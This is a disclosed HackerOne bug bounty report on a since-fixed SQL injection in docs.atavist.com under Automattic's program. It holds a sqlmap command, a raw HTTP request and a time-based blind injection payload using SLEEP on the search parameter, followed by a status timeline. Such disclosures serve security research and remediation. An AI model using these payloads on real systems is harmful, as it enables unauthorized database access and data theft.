---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2020-12-08
submitted: 2020-11-20T02:02:35.261Z
bounty_usd: null
votes: 170
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "lu3ky-13"
source: "https://hackerone.com/reports/1039315"
title: "Sql injection on docs.atavist.com"
---
# Sql injection on docs.atavist.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 170 | **Program:** Automattic | **Disclosed:** 2020-12-08

- Report: [https://hackerone.com/reports/1039315](https://hackerone.com/reports/1039315)
- CWE: SQL Injection
- Submitted: 2020-11-20T02:02:35.261Z

## Report summary

kurdistan-iraq

## Timeline

- **2020-11-20** @lu3ky-13: my command  sqlmap -r r --level=2 --risk=2 --dbs

r = text on sqlmap

GET /reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort= HTTP/1.1
Host: docs.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _fbp=fb.1.1605829485735.1219501220; __stripe_mid=f950034a-6de5-408c-b227-5ef48058f129d296dd; rgisanonymous=true; rguserid=5625868d-bfff-49dc-90ac-0269e5138dc8; rguuid=true
Upgrade-Insecure-Requests: 1
- **2020-11-20** @lu3ky-13: http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(1) AND 'WPrj' LIKE 'WPrj&sort=

Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'WPrj' LIKE 'WPrj&sort=
- **Report Filed**
- **2020-11-21** @lu3ky-13: any update
- **2020-11-23** @xknown: Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.
- **Report Triaged**
- **2020-11-23** @lu3ky-13: yes the vulnerability know is not working
- **2020-11-23** @lu3ky-13: fixed
- **2020-11-24** @lu3ky-13: any update ?
- **Report Resolved**
- **Bounty Awarded**
- **2020-11-26** @lu3ky-13: Hello @Automattic  can we disclosure it.
- **2020-11-27** @lu3ky-13: Hello @Automattic can we disclosure it. @xknown
- **Agreed On Going Public**
- **2020-12-02** @lu3ky-13: @Automattic  update?
- **Agreed On Going Public**
- **Report Became Public**
